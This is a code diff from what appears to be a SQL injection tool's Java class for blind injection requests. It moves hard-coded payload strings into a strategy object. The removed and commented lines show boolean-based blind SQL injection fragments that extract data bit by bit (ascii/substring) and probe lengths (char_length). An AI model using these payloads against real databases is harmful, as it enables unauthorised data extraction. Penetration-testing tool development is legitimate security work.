@@ -4,6 +4,7 @@ import java.util.LinkedList;
 import java.util.List;
 
 import com.jsql.model.blind.diff_match_patch.Diff;
+import com.jsql.model.injection.MediatorModel;
 
 /**
  * Define a call HTTP to the server, require the associated url, character
@@ -20,10 +21,11 @@ public class CallableBlind extends CallableAbstractBlind<CallableBlind> {
 
     /**
      * Constructor for preparation and blind confirmation.
-     * @param urlTest
+     * @param inj
      */
-    public CallableBlind(String urlTest) {
-        this.blindUrl = "+and+" + urlTest + "--+";
+    public CallableBlind(String inj) {
+//        this.blindUrl = "+and+" + inj + "--+";
+        this.blindUrl = MediatorModel.model().sqlStrategy.blindCheck(inj);
     }
     
     /**
@@ -33,19 +35,21 @@ public class CallableBlind extends CallableAbstractBlind<CallableBlind> {
      * @param bit
      */
     public CallableBlind(String inj, int indexCharacter, int bit) {
-        blindUrl = "+and+ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + "--+";
+//        this.blindUrl = "+and+ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + "--+";
+        this.blindUrl = MediatorModel.model().sqlStrategy.blindBitTest(inj, indexCharacter, bit);
         this.currentIndex = indexCharacter;
         this.currentBit = bit;
     }
     
     /**
      * Constructor for length test.
-     * @param newUrl
+     * @param inj
      * @param indexCharacter
      * @param isLengthTest
      */
-    public CallableBlind(String newUrl, int indexCharacter, boolean isLengthTest) {
-        this.blindUrl = "+and+char_length(" + newUrl + ")>" + indexCharacter + "--+";
+    public CallableBlind(String inj, int indexCharacter, boolean isLengthTest) {
+//        this.blindUrl = "+and+char_length(" + inj + ")>" + indexCharacter + "--+";
+        this.blindUrl = MediatorModel.model().sqlStrategy.blindLengthTest(inj, indexCharacter);
         this.isLengthTest = isLengthTest;
     }
 
